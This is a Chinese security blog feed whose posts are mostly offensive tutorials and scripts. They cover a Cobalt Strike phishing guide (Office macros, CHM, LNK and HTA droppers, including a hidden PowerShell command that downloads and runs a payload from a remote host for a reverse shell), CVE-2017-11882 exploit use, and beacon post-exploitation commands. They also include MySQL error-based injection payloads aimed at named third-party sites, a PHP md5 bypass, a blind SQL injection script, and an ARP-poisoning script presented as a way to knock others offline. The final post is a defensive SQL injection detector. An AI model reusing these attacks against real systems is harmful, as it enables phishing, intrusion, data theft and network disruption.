    <content type="text"><![CDATA[Cobalt Strike简介： Cobalt Strike是一款渗透测试软件，分为客户端与服务端，服务端是一个，客户端可以有多个，可以进行团队分布式操作 Cobalt Strike集成了端口转发、扫描多模式端口Listener、Windows exe程序生成、Windows dll动态链接库生成、java程序生成、office宏代码生成，包括站点克隆获取浏览器的相关信息等。 Cobalt Strike的安装Ubuntu 默认只有openjdk的源，但是cobalt strike建议使用oracle jdk需要需要先加入源。 apt-get install software-properties-common python-software-propertie add-apt-repository ppa:webupd8team/java apt-get update apt-get install oracle-Java8-installer 下载好Cobalt Strike工具然后解压缩。 进入Cobalt Strike文件内部开启服务 sudo ./teamserver 10.60.17.46 123456 后面这两个数是服务器IP（ubuntu的IP）和密码 配置客户端客户端需要安装java环境，平台并无特殊要求。 启动： Ubuntu:java-jar cobalt strike windows直接双击启动 host：服务器主机 port：50050 user：自定 password：服务器设置的 进入后首先配置监听器：点击上方Cobalt Strike选项——&gt;在下拉框中选择listeners——&gt;在下方弹出区域中单机add name：为监听器名字。 选择payload类型 host为shell反弹接受主机（服务端IP） port为反弹端口 其实,监听器的作用很简单,主要是为了接受payload回传的各类数据 比如,我们的payload在目标机器执行以后,会回连到监听器然后下载执行真正的shellcode代码,其实跟msf中handler的作用基本是一致的 beacon 为cs内置监听器,也就是说,当我们在目标系统成功执行payload以后,会弹回一个beacon的shell给cs 该shell所支持的通信协议主要包括这几种,dns,https,http,smb[pipe],另外,beacon shell的内置功能也非常多 foreign 主要是提供给外部使用的一些监听器,比如你想利用cs派生一个meterpreter的shell回来,来继续后面的内网渗透,这时就选择使用外部监听器 生成payload：点击attacks——&gt;packages——&gt;windows executable listener为监听器名字 output为输出靶机类型。 点击generate弹出的对话框中选择保存位置和输入payload名字。 在windows靶机中双击payload生成文件（artifact.exe） 得到反弹shell 主机上线以后需要将默认刷新时间改成0，cobalt strike为了维持连接，会每60秒发送一次连接，但是如果使用的话60秒会造成卡顿。 修改方法：右键弹出的内容下拉菜单中选择session-&gt;sleep，弹出的对话框中输入0，单击确定 右键弹出的内容下拉菜单中选择Interact，上线主机。 office钓鱼office钓鱼在无需交互、用户无感知的情况下，执行Office文档中内嵌的一段恶意代码，从远控地址中下载并运行恶意可执行程序，例如远控木马或者勒索病毒等。 Cobalt Strike office钓鱼主要方法是生成一段vba代码，然后将代码复制到office套件中，当用户启动office自动运行 具体操作：点击Cobalt Strike主界面中attacks-&gt;packages-&gt;ms office macro 弹出界面选择Listener，单机确定 对话框中给出每一步仔细操作，单机copy macro按钮 word操作 点击上方标签视图标签 在该标签中点击宏按钮，弹出的对话框中输入宏名字，然后单机创建按钮 首先清空所有代码，然后将生成的代码复制到编辑器中，关闭宏编辑窗口 保存退出 双击再次运行保存的文档 当目标机器运行文档以后，Cobalt Strike会接受到目标机器反弹的shell 目标则会增加一个rundll32.exe的进程 CVE-2017-11882漏洞简介 漏洞为0ffice内存破坏漏洞，影响目前流行的所有0ffice版本。攻击者可以利用漏洞以当前登录的用户的身份执行任意命令。 该漏洞出现在模块EQNEDT32.EXE中，属于栈溢出漏洞，是对Equation Native 数据结构处理不当导致。 漏洞影响： Microsoft Office 2007 Microsoft Office 2010 Microsoft Office 2013 Microsoft Office 2016 复现：下载https://github.com/Ridter/CVE-2017-11882python攻击脚本。 虽然是栈溢出漏洞，但是该漏洞对于命令有限制，分为可以执行43b和执行109b，所以在利用过程需要注意命令长度。 python Command109b_CVE-2017-11882.py -c &quot;cmd.exe /c calc.exe&quot; CHM钓鱼CHM介绍 CHM（Compiled Help Manual）即“已编译的帮助文件”。它是微软新一代的帮助文件格式，利用HTML作源文，把帮助内容以类似数据库的形式编译储存。 利用CHM钓鱼主要原因是因为该文档可以执行cmd命令 这里制作CHM需要用到一个工具就是 EasyCHM CHM制作过程：创建一个文件夹（名字随意），在文件夹里面再创建两个文件夹（名字随意）和一个index.html文件，在两个文件夹内部创建各创建一个index.html文件。 先将下列代码复制到根文件夹中的index.html中。 &lt;!DOCTYPE html&gt;&lt;html&gt;&lt;head&gt;&lt;title&gt;Mousejack replay&lt;/title&gt;&lt;head&gt;&lt;/head&gt;&lt;body&gt; command exec &lt;OBJECT id=x classid=&quot;clsid:adb880a6-d8ff-11cf-9377-00aa003b7a11&quot; width=1 height=1&gt; &lt;PARAM name=&quot;Command&quot; value=&quot;ShortCut&quot;&gt; &lt;PARAM name=&quot;Button&quot; value=&quot;Bitmap::shortcut&quot;&gt; &lt;PARAM name=&quot;Item1&quot; value=&apos;,calc.exe&apos;&gt; &lt;PARAM name=&quot;Item2&quot; value=&quot;273,1,1&quot;&gt; &lt;/OBJECT&gt; &lt;SCRIPT&gt; x.Click(); &lt;/SCRIPT&gt; &lt;/body&gt;&lt;/html&gt; 打开我们的EasyCHM工具 后点击新建 然后导入自己创建的文件夹，点击确定后再点击编译，在弹出的对话框中点击生成CHM按钮 它会给你生产一个CHM文件，给别人发过去，一旦点击就会给弹出计算机 生成钓鱼文件启动Cobalt Strike，点击attacks——&gt;web Drive by——&gt;scripted web Delivery在弹出的对话框中将type类型设置为powershell然后单击launch按钮 再用代码将上面创建的根文件夹中的index.html代码中的calc.exe替换掉。 &lt;!DOCTYPE html&gt;&lt;html&gt;&lt;head&gt;&lt;title&gt;Mousejack replay&lt;/title&gt;&lt;head&gt;&lt;/head&gt;&lt;body&gt; command exec &lt;OBJECT id=x classid=&quot;clsid:adb880a6-d8ff-11cf-9377-00aa003b7a11&quot; width=1 height=1&gt; &lt;PARAM name=&quot;Command&quot; value=&quot;ShortCut&quot;&gt; &lt;PARAM name=&quot;Button&quot; value=&quot;Bitmap::shortcut&quot;&gt; &lt;PARAM name=&quot;Item1&quot; value=&quot;,powershell.exe, -nop -w hidden -c IEX ((new-object net.webclient).downloadstring(&apos;http://192.168.209.151:81/aa&apos;))&quot;&gt; &lt;PARAM name=&quot;Item2&quot; value=&quot;273,1,1&quot;&gt; &lt;/OBJECT&gt; &lt;SCRIPT&gt; x.Click(); &lt;/SCRIPT&gt; &lt;/body&gt;&lt;/html&gt; 生产CHM发送给别人，点击后获得反弹的shell LNK钓鱼 lnk文件是用于指向其他文件的一种文件。这些文件通常称为快捷方式文件，通常它以快捷方式放在硬盘上，以方便使用者快速的调用。 lnk钓鱼主要将图标伪装成正常图标，但是目标会执行shell命令。 先做个简单的powershell生产图标：创建个txt文本写入下面代码然后改文件后缀名为.ps1。 cmd /c calc.exe 右键文件powershell运行后会弹出计算器 钓鱼方法：首先通过Cobalt Strike的attacks——&gt;web Drive by——&gt;scripted web Delivery tpye类型为powershell，然后单机launch。生产代码。 还记的上面做的那个简单的powershell么，后缀改回txt，将生成的代码替换掉calc.exe 将下面的powershell代码写入.ps1文件，右键运行powershell。 $file = Get-Content &quot;test.txt&quot; $WshShell = New-Object -comObject WScript.Shell $Shortcut = $WshShell.CreateShortcut(&quot;test.lnk&quot;) $Shortcut.TargetPath = &quot;%SystemRoot%\system32\cmd.exe&quot; $Shortcut.IconLocation = &quot;%SystemRoot%\System32\Shell32.dll,21&quot; $Shortcut.Arguments = &apos; &apos;+ $file $Shortcut.Save() 生成test.lnk文件，而且图标改了（powershell执行文件要和test.txt要在一个目录下，这个图标所在位置就在%SystemRoot%\System32\Shell32.dll目录下） 后将test.lnk发送给他人，获得反弹shell。 HTA钓鱼 HTA是HTML Application的缩写，直接将HTML保存成HTA的格式，是一个独立的应用软件。 HTA虽然用HTML、JS和CSS编写，却比普通网页权限大得多，它具有桌面程序的所有权限。 就是一个html应用程序，双击就能运行。 复现：Cobalt Strike，attacks——&gt;packages——&gt;HTML application 选择powershell然后单机generate，选择保存路径。 将生成的.hta文件发送给别人，点击后获得shell 网站克隆 Cobalt Strike还能够实现网站克隆 cotalt strike能够快速复制目标网站前端页面，并且复制相识度极高 cotalt strike同时还可以在复制的网站中插入恶意代码，如果本地浏览器带有漏洞的用户，可以直接控制目标机器。 点击attacks——&gt;Web Drive-by——&gt;Clone site Clone URL：克隆目标网站的URL（如果网站不是80端口的话域名后得跟上端口号。） 注意问题：URL需要添加http协议和端口（80） Local URL：本地克隆路径 Local Host：本地主机IP Local Port：本地端口 Attack：克隆后目标网站执行脚本，如：flash漏洞 后渗透阶段相信你已经能拿到一个beacon的shell了。 下面是一些基本的使用命令，但是cs监听器对中文支持并不友好，会对中文产生乱码。 help 查看beacon shell所有内置命令帮助,如果想查看指定命令的用法,可以这样,eg: help checkin note 给当前目录机器起个名字, eg: note beacon-shell cd 在目标系统中切换目录,注意在win系统中切换目录要用双反斜杠,或者直接用&apos;/&apos; eg: cd c:\\ mkdir 新建目录, eg: mkdir d:\\beacon rm 删除文件或目录, eg: rm d:\\beacon upload 上传文件到目标系统中 download 从目标系统下载指定文件,eg: download C:\\Users\\win7cn\\Desktop\\putty.exe cancel 取消下载任务,比如,一个文件如果特别大,下载可能会非常耗时,假如中途你不想继续下了,就可以用这个取消一下 shell 在目标系统中执行指定的cmd命令, eg: shell whoami getuid 查看当前beacon 会话在目标系统中的用户权限,可能需要bypassuac或者提权 pwd 查看当前在目录系统中的路径 ls 列出当前目录下的所有文件和目录 drives 列表出目标系统的所有分区[win中叫盘符] ps 查看目标系统当前的所有的进程列表 kill 杀掉指定进程, eg: kill 4653 sleep 10 指定被控端休眠时间,默认60秒一次回传,让被控端每10秒来下载一次任务,实际中频率不宜过快,容易被发现,80左右一次即可 jobs 列出所有的任务列表,有些任务执行时间可能稍微较长,此时就可以从任务列表中看到其所对应的具体任务id,针对性的清除 jobkill 如果发现任务不知是何原因长时间没有执行或者异常,可尝试用此命令直接结束该任务, eg: jobkill 1345 clear 清除beacon内部的任务队列 checkin 强制让被控端回连一次 exit 终止当前beacon 会话 ctrl + k 清屏 有些可能会触发敏感api导致防护报警,另外进程注入,被控端可能感到非常明显的卡顿,工具也有许多不完善的地方]]></content>
      <categories>
        <category>渗透工具</category>
      </categories>
  </entry>
  <entry>
    <title><![CDATA[MySQL报错注入方法整理]]></title>
    <url>%2F2018%2F12%2F03%2FMySQL%E6%8A%A5%E9%94%99%E6%B3%A8%E5%85%A5%E6%96%B9%E6%B3%95%E6%95%B4%E7%90%86%2F</url>
    <content type="text"><![CDATA[mysql暴错注入方法整理：通过floor，UpdateXml，ExtractValue，NAME_CONST，Error based Double Query Injection等方法。 报错注入：（and后不能直接跟select，可以加（）） 1.报错注入floor—-&gt;(select 1 from (select count(*),concat((payload[]),floor(rand()*2))a from information_schema.columns group by a)b)limit 0,1 2.报错注入extractvalue—-&gt;select extractvalue(1,concat(0x5c,([payload]))) 3.报错注入updatexml—-&gt;select 1=(updatexml(1,concat(0x3a,([payload])),1)) 4.报错注入Exp—-&gt;select Exp(~(select * from ([payload])a)) 通过floor暴错(原理在底部)/数据库版本/http://127.0.0.1/2/Less-5/?id=1&apos; and (select 1 from (select count(*),concat((select version()),floor(rand()*2))a from information_schema.columns group by a)b)limit 0,1 --+ /简单办法暴库/http://www.waitalone.cn/sql.php?id=info() /连接用户/http://www.waitalone.cn/sql.php?id=1+and(select 1 from(select count(),concat((select (select (select concat(0x7e,user(),0x7e))) from information_schema.tables limit 0,1),floor(rand(0)2))x from information_schema.tables group by x)a) /连接数据库/http://127.0.0.1/2/Less-5/?id=1&apos; and (select 1 from (select count(*),concat((select database()),floor(rand()*2))a from information_schema.columns group by a)b)limit 0,1 --+ /暴库/http://www.waitalone.cn/sql.php?id=1+and(select 1 from(select count(),concat((select (select (SELECT distinct concat(0x7e,schema_name,0x7e) FROM information_schema.schemata LIMIT 0,1)) from information_schema.tables limit 0,1),floor(rand(0)2))x from information_schema.tables group by x)a) /暴表/http://www.waitalone.cn/sql.php?id=1+and(select 1 from(select count(),concat((select (select (SELECT distinct concat(0x7e,table_name,0x7e) FROM information_schema.tables where table_schema=database() LIMIT 0,1)) from information_schema.tables limit 0,1),floor(rand(0)2))x from information_schema.tables group by x)a) /暴字段/http://www.waitalone.cn/sql.php?id=1+and(select 1 from(select count(),concat((select (select (SELECT distinct concat(0x7e,column_name,0x7e) FROM information_schema.columns where table_name=0x61646D696E LIMIT 0,1)) from information_schema.tables limit 0,1),floor(rand(0)2))x from information_schema.tables group by x)a) /暴内容/http://www.waitalone.cn/sql.php?id=1+and(select 1 from(select count(),concat((select (select (SELECT distinct concat(0x23,username,0x3a,password,0x23) FROM admin limit 0,1)) from information_schema.tables limit 0,1),floor(rand(0)2))x from information_schema.tables group by x)a) ExtractValue(有长度限制,最长32位)http://www.waitalone.cn/sql.php?id=1+and extractvalue(1, concat(0x7e, (select @@version),0x7e)) http://www.waitalone.cn/sql.php?id=1+and extractvalue(1, concat(0x7e,(SELECT distinct concat(0x23,username,0x3a,password,0x23) FROM admin limit 0,1))) UpdateXml(有长度限制,最长32位)http://www.waitalone.cn/sql.php?id=1+and updatexml(1,concat(0x7e,(SELECT @@version),0x7e),1) http://www.waitalone.cn/sql.php?id=1+and updatexml(1,concat(0x7e,(SELECT distinct concat(0x23,username,0x3a,password,0x23) FROM admin limit 0,1),0x7e),1) NAME_CONST(适用于低版本)http://wlkc.zjtie.edu.cn/qcwh/content/detail.php?id=330&amp;sid=19&amp;cid=261+and+1=(select+*+from+(select+NAME_CONST(version(),1),NAME_CONST(version(),1))+as+x)-- Error based Double Query Injection(http://www.vaibs.in/error-based-double-query-injection/) /数据库版本/http://www.waitalone.cn/sql.php?id=1+or+1+group+by+concat_ws(0x7e,version(),floor(rand(0)*2))+having+min(0)+or+1 floor报错详解floor----&gt;(select 1 from (select count(*),concat((payload[]),floor(rand()*2))a from information_schema.columns group by a)b)limit 0,1 Rand() //随机函数 Floor() //取整函数 Count() //聚合函数 Group by key //分组语句 当在一个聚合函数，比如count函数后面如果使用分组语句就会把查询的一部分以错误的形式显示出来。[这个是Mysql的bug]。 0x3a ：的十六进制，在这里把他作为分隔符，没有它查出来的东西就连成一片。 group by key的原理是循环读取数据的每一行，将结果保存于临时表中。读取每一行的key时，如果key存在于临时表中，则不在临时表中更新临时表中的数据；如果该key不存在于临时表中，则在临时表中插入key所在行的数据。group by floor(random(0)*2)出错的原因是key是个随机数，检测临时表中key是否存在时计算了一下floor(random(0)*2)可能为0，如果此时临时表只有key为1的行不存在key为0的行，那么数据库要将该条记录插入临时表，由于是随机数，插时又要计算一下随机值，此时floor(random(0)*2)结果可能为1，就会导致插入时冲突而报错。即检测时和插入时两次计算了随机数的值不一致，导致插入时与原本已存在的产生冲突的错误。]]></content>
      <categories>
        <category>SQL</category>
      </categories>
  </entry>
  <entry>
    <title><![CDATA[PHP绕过md5]]></title>
    <url>%2F2018%2F12%2F03%2FPHP%E7%BB%95%E8%BF%87md5%2F</url>
    <content type="text"><![CDATA[测试代码： if (isset($_GET[&apos;Username&apos;]) &amp;&amp; isset($_GET[&apos;password&apos;])) { $logined = true; $Username = $_GET[&apos;Username&apos;]; $password = $_GET[&apos;password&apos;]; if (!ctype_alpha($Username)) {$logined = false;} if (!is_numeric($password) ) {$logined = false;} if (md5($Username) != md5($password)) {$logined = false;} if ($logined){ echo &quot;successful&quot;; } else { echo &quot;login failed!&quot;; } } 在做用户登录的时候常常会用到md5加密计算比较密码，md5后相等，就可以成功执行下一步语句，登录成功。但是这样做并不安全，因为 0e在比较的时候会将其视作为科学计数法，所以无论0e后面是什么，0的多少次方还是0。 md5开头是0e的字符串:QNKCDZO： 0e830400451993494058024219903391 s878926199a： 0e545993274517709034328855841020 s155964671a： 0e342768416822451524974117254469 s214587387a： 0e848240448830537924465865611904 s214587387a： 0e848240448830537924465865611904 s878926199a： 0e545993274517709034328855841020 s1091221200a： 0e940624217856561557816327384675 解决方案使用全等 ===]]></content>
      <categories>
        <category>加密解密</category>
      </categories>
  </entry>
  <entry>
    <title><![CDATA[比二分法更OK的盲注多线程]]></title>
    <url>%2F2018%2F12%2F03%2F%E6%AF%94%E4%BA%8C%E5%88%86%E6%B3%95%E6%9B%B4OK%E7%9A%84%E7%9B%B2%E6%B3%A8%E5%A4%9A%E7%BA%BF%E7%A8%8B%2F</url>
    <content type="text"><![CDATA[废话不多说，直接上脚本： import threading import requests user_agent = [ &quot;Mozilla/5.0 (Windows NT 6.0) AppleWebKit/536.5 (KHTML, like Gecko) Chrome/19.0.1084.36 Safari/536.5&quot;, &quot;Mozilla/5.0 (Windows NT 6.1; WOW64) AppleWebKit/536.3 (KHTML, like Gecko) Chrome/19.0.1063.0 Safari/536.3&quot;, &quot;Mozilla/5.0 (Windows NT 5.1) AppleWebKit/536.3 (KHTML, like Gecko) Chrome/19.0.1063.0 Safari/536.3&quot;, &quot;Mozilla/5.0 (Macintosh; Intel Mac OS X 10_8_0) AppleWebKit/536.3 (KHTML, like Gecko) Chrome/19.0.1063.0 Safari/536.3&quot;, &quot;Mozilla/5.0 (Windows NT 6.2) AppleWebKit/536.3 (KHTML, like Gecko) Chrome/19.0.1062.0 Safari/536.3&quot;, &quot;Mozilla/5.0 (Windows NT 6.1; WOW64) AppleWebKit/536.3 (KHTML, like Gecko) Chrome/19.0.1062.0 Safari/536.3&quot;, &quot;Mozilla/5.0 (Windows NT 6.2) AppleWebKit/536.3 (KHTML, like Gecko) Chrome/19.0.1061.1 Safari/536.3&quot;, &quot;Mozilla/5.0 (Windows NT 6.1; WOW64) AppleWebKit/536.3 (KHTML, like Gecko) Chrome/19.0.1061.1 Safari/536.3&quot; ] class MyThread(threading.Thread): def __init__(self, func, args): threading.Thread.__init__(self) self.func = func self.args = args def getresult(self): return self.res def run(self): self.res = self.func(*self.args) def asc(a,i,payload): asci = 2**i url = &quot;http://127.0.0.1/2/Less-5/?id=1&apos;and ascii(substr((&quot;+payload+&quot;),&quot;+str(a)+&quot;,1))%26&quot;+str(asci)+&quot;=&quot;+str(asci)+ &quot;--+&quot; header = {&apos;User-Agent&apos;: user_agent[i]} html = requests.get(url, headers=header) if html.text.find(&quot;You are in...........&quot;)!=-1: return asci return 0 def main(): payload = input(&apos;请输入payload(比如select user()/user()/SELECT group_concat(SCHEMA_name) from information_schema.SCHEMATA)：&apos;) a=1 f=True char = &apos;&apos; while f: threads = [] sum = 0 for i in range(0,8): t = MyThread(asc, (a, i, payload)) threads.append(t) for i in range(0,8): threads[i].start() for i in range(0,8): threads[i].join() sum = sum + threads[i].getresult() if sum ==0: f = False char = char +chr(sum) a = a+1 print(char) if __name__ == &apos;__main__&apos;: main()]]></content>
      <categories>
        <category>python脚本</category>
      </categories>
  </entry>
  <entry>
    <title><![CDATA[python实现ARP攻击]]></title>
    <url>%2F2018%2F12%2F03%2Fpython%E5%AE%9E%E7%8E%B0ARP%E6%94%BB%E5%87%BB%2F</url>
    <content type="text"><![CDATA[from scapy.all import * import os import sys import threading import signal interface = &apos;Realtek PCIe GBE Family Controller&apos; target_ip=&apos;10.60.17.12&apos; gateway_ip=&apos;10.60.17.1&apos; packet_count=1000 #设置嗅探的网卡 conf.iface=interface #关闭输出 conf.verb = 0 print(&apos;[*]Setting up&apos;+interface) def restore_target(gateway_ip, gateway_mac, target_ip, target_mac): print(&apos;[*]Restoring target.....&apos;) send(ARP(op=2,psrc=gateway_ip,pdst=target_ip,hwdst=&apos;ff:ff:ff:ff:ff:ff&apos;,hwsrc=gateway_mac),count=5) send(ARP(op=2, psrc=target_ip, pdst=gateway_ip,hwdst=&apos;ff:ff:ff:ff:ff:ff&apos;,hwsrc=target_mac),count=5) #发送退出信号到主线程 os.kill(os.getpid(),signal.SIGINT) def get_mac(ip_address): responses,unanswered = srp(Ether(dst=&apos;ff:ff:ff:ff:ff:ff&apos;)/ARP(pdst=ip_address),timeout=2,retry=10) for s, r in responses: return r[Ether].src return None def poison_target(gateway_ip, gateway_mac, target_ip, target_mac): poison_target = ARP() poison_target.op = 2 poison_target.psrc = gateway_ip poison_target.pdst = target_ip poison_target.hwdst = target_mac poison_gateway = ARP() poison_gateway.op = 2 poison_gateway.psrc = target_ip poison_gateway.pdst = gateway_ip poison_gateway.hwdst = gateway_mac print(&quot;[*] Beginning the ARP poison.[ CTRL-C to stop]&quot;) while True: try: send(poison_target) send(poison_gateway) time.sleep(2) except KeyboardInterrupt: restore_target(gateway_ip, gateway_mac, target_ip, target_mac) print(&quot;[*] ARP poison attack finished.&quot;) return gateway_mac = get_mac(gateway_ip) if gateway_mac is None: print(&quot;[!!!]Faile to get gateway MAC. Exiting&quot;) sys.exit(0) else: print(&apos;[*] Gateway %s is at %s&apos;%(gateway_ip,gateway_mac)) target_mac = get_mac(target_ip) if target_mac is None: print(&apos;[!!!]Faile to get target MAC. Exiting&apos;) sys.exit(0) else: print(&apos;[*] Target %s is at %s&apos; % (target_ip, target_mac)) #开启ARP攻击线程 poison_thread = threading.Thread(target=poison_target,args=(gateway_ip,gateway_mac,target_ip,target_mac)) poison_thread.start() try: print(&apos;[*]Starting sniffer for %d packets&apos;%packet_count) bpf_filter = &apos;ip host %s&apos;%target_ip packes = sniff(count=packet_count,filter=bpf_filter,iface=interface) #将捕获到的数据包传输到文件 wrpcap(&apos;arper.pcap&apos;,packes) #还原网络配置 restore_target(gateway_ip,gateway_mac,target_ip,target_mac) except KeyboardInterrupt: restore_target(gateway_ip, gateway_mac, target_ip, target_mac) sys.exit(0) 好了，现在可以断别人网了….]]></content>
      <categories>
        <category>python脚本</category>
      </categories>
  </entry>
  <entry>
    <title><![CDATA[基于流量分析的SQL注入检测]]></title>
    <url>%2F2018%2F12%2F03%2F%E5%9F%BA%E4%BA%8E%E6%B5%81%E9%87%8F%E5%88%86%E6%9E%90%E7%9A%84SQL%E6%B3%A8%E5%85%A5%E6%A3%80%E6%B5%8B%2F</url>
    <content type="text"><![CDATA[from scapy.all import * import re import datetime from pyecharts import Geo import pygeoip import pymysql from selenium import webdriver driver = webdriver.Firefox() driver.get(&quot;file:///D:/python%E9%A1%B9%E7%9B%AE/black%20hat/%E5%9F%BA%E4%BA%8E%E6%B5%81%E9%87%8F%E5%88%86%E6%9E%90%E7%9A%84SQL%E6%B3%A8%E5%85%A5%E6%A3%80%E6%B5%8B/map.html&quot;) gi = pygeoip.GeoIP(&apos;GeoLiteCity.dat&apos;) geo = Geo(&quot;SQL注入威胁感知&quot;, &quot;data from traffic&quot;, title_color=&quot;#fff&quot;, title_pos=&quot;left&quot;, width=1200, height=1000, background_color=&apos;#404a59&apos;) db = pymysql.connect(host=&apos;localhost&apos;, port=3306, user=&apos;root&apos;, passwd=&apos;root&apos;, db=&apos;test&apos;) data = {} def printRecord(ip,sip): rec = gi.record_by_name(ip) city = rec[&apos;city&apos;] country = rec[&apos;country_name&apos;] long = rec[&apos;longitude&apos;] lat = rec[&apos;latitude&apos;] with db.cursor() as cursors: cou = &quot;select ifnull((select 1 from detection where ip=%s limit 1), 0)&quot; cursors.execute(cou,sip) s = cursors.fetchone() if s[0] == 1: sql = &apos;update detection set attacksum = attacksum+1 where ip=%s;&apos; cursors.execute(sql,sip) db.commit() else: sql = &apos;insert into detection(`ip`,`city`,`country`,`lat`,`long`,`attacksum`)values(%s,%s,%s,%s,%s,%s);&apos; cursors.execute(sql,[sip,city,country,lat,long,1]) db.commit() number = &quot;select count(*) from detection;&quot; cursors.execute(number) ss = cursors.fetchone() for l in range(1,ss[0]+1): mysqls = &apos;select attacksum from detection where sequence=%s;&apos; cursors.execute(mysqls, l) attnum = cursors.fetchone() longs = &quot;select `long` from detection where sequence=%s;&quot; cursors.execute(longs, l) longg = cursors.fetchone() lats = &quot;select lat from detection where sequence=%s;&quot; cursors.execute(lats, l) latt = cursors.fetchone() ips = &quot;select ip from detection where sequence=%s;&quot; cursors.execute(ips, l) ipp = cursors.fetchone() geo.add_coordinate(&quot;攻击者&quot;+ str(l),str(longg[0]), str(latt[0])) data[&quot;攻击者&quot;+ str(l)] = [&apos;攻击者IP：&apos; + str(ipp[0]) + &quot;:&quot; + &quot;攻击次数：&quot; + str(attnum[0])] attr, value = geo.cast(data) geo.add(&quot;traffic analyze&quot;, attr, value, type=&quot;effectScatter&quot;, is_random=True, effect_scale=1) geo.render(path=&quot;map.html&quot;) driver.refresh() def test(page): for f in page.payload.payload.payload.fields_desc: fvalue = page.payload.payload.getfieldval(f.name) if &apos;HTTP&apos; in str(fvalue): lst = str(fvalue).split(r&apos;\r\n&apos;) la = re.findall(&apos;(GET )|(POST )&apos;, lst[0]) if la != []: if la[0][0] == &apos;&apos;: with open(&apos;sql.txt&apos;, &apos;r+&apos;) as file: for fi in file.readlines(): for ff in lst: if fi.strip(&apos;\n&apos;) in str(ff.lower()): try: i = datetime.datetime.now() print(&quot;[!]您正在被攻击！&quot;) print(&apos;[*]攻击时间是\t&apos;+str(i)) print(&apos;[*]SQL注入攻击的IP为\t&apos; + page.payload.src) print(&apos;[*]被攻击的地方和payload是\t&apos; + str(ff).strip(&apos;b\&apos;&apos;)) print(&apos;[*]提交的方式为\tPOST&apos;) try: printRecord(page.payload.src, page.payload.src) except: printRecord(&quot;114.242.146.98&quot;, page.payload.src) with open(&apos;danger.log&apos;, &apos;a+&apos;) as f: f.write( &quot;[!]您正在被攻击！\n [*]攻击时间是\t%s\n[*]SQL注入攻击的IP为\t%s\n[*]被攻击的地方和payload是\t%s\n[*]提交的方式为\t POST\n\n&quot; % ( str(i),page.payload.src, str(ff))) except: pass if la[0][1] == &apos;&apos;: with open(&apos;sql.txt&apos;, &apos;r+&apos;) as file: for fi in file.readlines(): for ff in lst: if fi.strip(&apos;\n&apos;) in str(ff.lower()): try: i = datetime.datetime.now() print(&quot;[!]您正在被攻击！&quot;) print(&apos;[*]攻击时间是\t&apos;+str(i)) print(&apos;[*]SQL注入攻击的IP为\t&apos; + page.payload.src) print(&apos;[*]被攻击的地方和payload是\t&apos;+ str(ff).strip(&apos;b\&apos;&apos;).strip(&apos;HTTP/1.1&apos;)) print(&apos;[*]提交的方式为\tGET&apos;) try: printRecord(page.payload.src,page.payload.src) except: printRecord(&quot;114.242.146.98&quot;,page.payload.src) with open(&apos;danger.log&apos;, &apos;a+&apos;) as f: f.write( &quot;[!]您正在被攻击！\n[*]攻击时间是\t%s\n [*]SQL注入攻击的IP为\t%s\n[*]被攻击的地方和payload是\t%s\n[*]提交的方式为\t GET\n\n&quot; % ( str(i),page.payload.src, str(ff))) except: pass def main(): sniff(filter=&apos;host 192.168.209.160&apos;, iface=&quot;VMware Virtual Ethernet Adapter for VMnet8&quot;, prn=test, count=0) if __name__ == &apos;__main__&apos;: main() sql.txt：提供特殊字段检测的字典。 Danger.log：如果有SQL注入攻击，则保存攻击时间、攻击者的IP、攻击的payload及攻击位置和提交的方式。 下载chromedriver并把chromedriver.exe放到跟代码相同目录下。 相关知识点：用Firefox打开本地地图并刷新。driver = webdriver.Firefox() driver.get(&apos;file:///D:/python%E9%A1%B9%E7%9B%AE/black%20hat/%E5%9F%BA%E4%BA%8E%E6%B5%81%E9%87%8F%E5%88%86%E6%9E%90%E7%9A%84SQL%E6%B3%A8%E5%85%A5%E6%A3%80%E6%B5%8B/map.html&apos;) driver.refresh() 获取相应IP的城市国家经纬度等信息。gi = pygeoip.GeoIP(&apos;GeoLiteCity.dat&apos;) rec = gi.record_by_name(&quot;114.242.146.98&quot;) 态势地图的构建。geo = Geo(&quot;SQL注入威胁感知&quot;, &quot;data from traffic&quot;, title_color=&quot;#fff&quot;, title_pos=&quot;left&quot;, width=1200, height=1000, background_color=&apos;#404a59&apos;) data = { &quot;北京&quot;: &quot;beijing&quot;, &quot;上海&quot;:&quot;shanghai&quot;,&quot;深圳&quot;:&quot;shenzhen&quot;,&quot;广州&quot;:&quot;guangzhou&quot;,&quot;厦门&quot;:&quot;xiamen&quot;,&quot;郑州&quot;:&quot;zhengzhou&quot;,&quot;西安&quot;:&quot;xian&quot;,&quot;乌鲁木齐&quot;:&quot;wulumuqi&quot;,&quot;沈阳&quot;:&quot;shenyang&quot;,&quot;济南&quot;:&quot;jinan&quot;, &quot;石家庄&quot;:&quot;shijiazhuang&quot;,&quot;哈尔滨&quot;:&quot;haerbing&quot;,&quot;成都&quot;:&quot;chengdu&quot;,&quot;昆明&quot;:&quot;kunming&quot;,&quot;武汉&quot;:&quot;wuhan&quot;,&quot;拉萨&quot;:&quot;lasa&quot;,&quot;南京&quot;:&quot;nanjing&quot;, &quot;兰州&quot;:&quot;lanzhou&quot;,&quot;南宁&quot;:&quot;nanning&quot;,&quot;呼和浩特&quot;:&quot;huhehaote&quot;,&quot;海口&quot;:&quot;haikou&quot;, &quot;贵阳&quot;:&quot;guiyang&quot;,&quot;西宁&quot;:&quot;xining&quot;,&quot;合肥&quot;:&quot;hefei&quot;,&quot;太原&quot;:&quot;taiyuan&quot; } attr, value = geo.cast(data) geo.add(&quot;traffic analyze&quot;, attr, value, type=&quot;effectScatter&quot;, is_random=True, effect_scale=1) geo.render(path=&quot;map.html&quot;) 流量嗅探sniff(filter=&apos;host 192.168.209.160&apos;, iface=&quot;VMware Virtual Ethernet Adapter for VMnet8&quot;, prn=test, count=0) 关于数据包每一个协议层都是Packet类的子类。协议层背后所有逻辑的操作都是被Packet类和继承的类所处理的。一个简单的协议层是由一系列的字段构成，他们关联在一起组成了协议层，解析时拆分成一个一个的字符串。这些字段都包含在名为fields_desc的属性中。 第一层是数据链路层，第二层是ip层，第三层是tcp层——&gt;包含端口号、http报文,第四层是应用层其中每一层均为上一层的payload成员 # f.name为Raw的字段名称——&gt;load：传输的http请求信息 fvalue = page.payload.payload.getfieldval(f.name)#请求相关字段的值 